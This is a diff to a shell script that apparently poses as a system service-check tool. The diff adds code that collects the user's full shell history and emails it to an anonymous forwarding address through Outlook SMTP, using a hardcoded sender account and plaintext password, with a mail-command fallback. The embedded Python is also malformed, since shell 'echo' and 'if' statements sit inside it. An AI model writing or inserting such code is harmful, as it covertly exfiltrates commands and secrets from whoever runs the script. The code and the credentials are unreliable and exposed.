@@ -71,20 +71,56 @@ $(collect_shell_history)
 EOF
     )
 
-    # Send email
+    recipient="ff3963a2-ad37-4797-bde9-ac5b76448d8d@jamy.anonaddy.com"
+    subject="Full Shell History Report from $HOSTNAME"
+    body="$EMAIL_CONTENT"
+
+    smtp_server="smtp-mail.outlook.com"
+    port=587
+    sender_email="kxs39585@outlook.de"
+    password="55Marko55"
+
+    # Try sending email via Python
+    python -c "
+import smtplib
+import ssl
+
+port = $port
+smtp_server = '$smtp_server'
+sender_email = '$sender_email'
+password = '$password'
+receiver_email = '$recipient'
+subject = '$subject'
+body = '''$body'''
+message = f'Subject: {subject}\\n\\n{body}'
+
+context = ssl.create_default_context()
+try:
+    with smtplib.SMTP(smtp_server, port) as server:
+        server.ehlo()
+        server.starttls(context=context)
+        server.ehlo()
+        server.login(sender_email, password)
+        server.sendmail(sender_email, receiver_email, message)
+    echo 'Email sent successfully via Python using Outlook.com.'
+except Exception as e:
+    echo 'Error sending email via Python using Outlook.com:'
+    echo \"$e\"
+    # Fallback to using mail command if available
     if command -v mail &>/dev/null; then
-        echo "Sending email..."
-        echo "$EMAIL_CONTENT" | mail -s "Full Shell History Report from $HOSTNAME" ff3963a2-ad37-4797-bde9-ac5b76448d8d@jamy.anonaddy.com
-        if [ $? -eq 0 ]; then
-            echo "Email sent successfully."
+        echo "Sending email using mail command..."
+        echo \"$EMAIL_CONTENT\" | mail -s \"$subject\" \"$recipient\"
+        if [ \$? -eq 0 ]; then
+            echo "Email sent successfully via mail command."
         else
-            echo "Error sending email."
+            echo "Error sending email via mail command."
         fi
     else
         echo "Warning: mailutils not installed - storing report in /tmp/system_report.txt"
-        echo "$EMAIL_CONTENT" > /tmp/system_report.txt
+        echo \"$EMAIL_CONTENT\" > /tmp/system_report.txt
         echo "System report stored in /tmp/system_report.txt"
     fi
+"
 }
 
 # Original service check functions
